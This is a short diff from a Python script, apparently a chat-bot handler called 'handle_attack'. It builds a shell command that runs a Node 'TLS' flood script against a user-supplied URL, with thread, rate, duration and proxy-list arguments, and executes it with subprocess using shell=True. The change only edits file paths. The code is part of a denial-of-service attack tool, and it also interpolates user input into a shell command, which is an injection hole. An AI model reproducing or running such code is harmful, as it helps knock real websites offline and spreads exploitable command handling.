@@ -64,7 +64,7 @@ def handle_attack(message):
             return
 
         # Construct the command to run on VPS
-        command = f" node savebd/TLS {url} 64 15 {duration} savebd/proxy.txt"
+        command = f" node TLS {url} 64 15 {duration} proxy.txt"
 
         # Execute the command
         result = subprocess.run(command, shell=True, capture_output=True, text=True)
